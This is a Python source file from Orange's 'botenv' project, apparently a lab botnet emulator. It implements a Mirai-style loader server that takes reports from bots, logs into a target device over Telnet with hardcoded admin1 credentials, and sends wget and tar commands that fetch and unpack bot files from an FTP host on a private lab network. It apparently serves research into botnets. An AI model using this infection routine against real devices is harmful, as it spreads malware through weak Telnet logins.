#!/usr/bin/env python3 
# -*- coding: utf-8 -*-

"""
 Software Name : botenv
 SPDX-FileCopyrightText: Copyright (c) 2021 Orange
 SPDX-License-Identifier: GPL-2.0-only

 This software is distributed under the GNU General Public License v2 only,
 the text of which is available at https://spdx.org/licenses/GPL-2.0-only.html
 or see the 'LICENCE' file for more details.

 Author: Elkin AGUAS <elkin.aguas@orange.com>
"""

import socket
import time
import threading
from telnetlib import Telnet

class servers:
    def __init__(self, name):
        self.name = name
	
    # Handles connection threads from bots
    def threaded_bot(self, connection):
        connection.send(str.encode('Welcome to the Loader\n'))
        while True:
            data = connection.recv(2048)
            print(data)
            reply = 'Info received'
            if not data:
                break
            else:
                self.device_connect(ip=data.decode().split('_')[0], user=data.decode().split('_')[1],
                password=data.decode().split('_')[2])
            connection.sendall(str.encode(reply))
        
        connection.close()

    # Starts loader server
    def start_loader(self, ip='127.0.0.1'):
        ServerSocket = socket.socket()
        port = 2525
        ThreadCount = 0
        thread_list = []

        try:
            ServerSocket.bind((ip, port))
        except socket.error as e:
            print(str(e))

        print('Waiting for a Connection..')
        ServerSocket.listen(5)

        while True:
            bot, address = ServerSocket.accept()
            print('Connected to: ' + address[0] + ':' + str(address[1]))
            ident = threading.Thread(target=self.threaded_bot, args=(bot, ))
            ident.start()
            print("identifier: "+str(ident))
            thread_list.append(ident)
            ThreadCount = threading.active_count()

            print('Thread Number: ' + str(ThreadCount))
        
        ServerSocket.close()

    # Handles connection to device to be infected
    def device_connect(self, ip='127.0.0.1', user='', password=''):
        username = "admin1\n"
        password = "admin1\n"
        command1 = b"wget -m ftp://admin1:admin1@192.168.11.5/bot_files.tar.gz -P /home/admin1\n"
        command2 = b"mv ./192.168.11.5/bot_files.tar.gz /home/admin1/ ; rm -r /home/admin1/192.168.11.5/ ; tar -xzvf bot_files.tar.gz\n"
        tn = Telnet('192.168.17.2', timeout=2)
        tn.read_until(b'to17 login: ', timeout=0.1)
        tn.write(username.encode('ascii'))
        tn.read_until(b'Password: ', timeout=0.1)
        tn.write(password.encode('ascii'))
        a = tn.read_until(b"\r\n", timeout=0.1)
        tn.write(command1)
        tn.write(command2)
        time.sleep(2)
        print(tn.read_some())
        if a == b"\r\n":
            print("It worked!")
        else:
            print("It didn't work :(")

def main(): 
	pass 
 
if __name__ == "__main__": 
	main()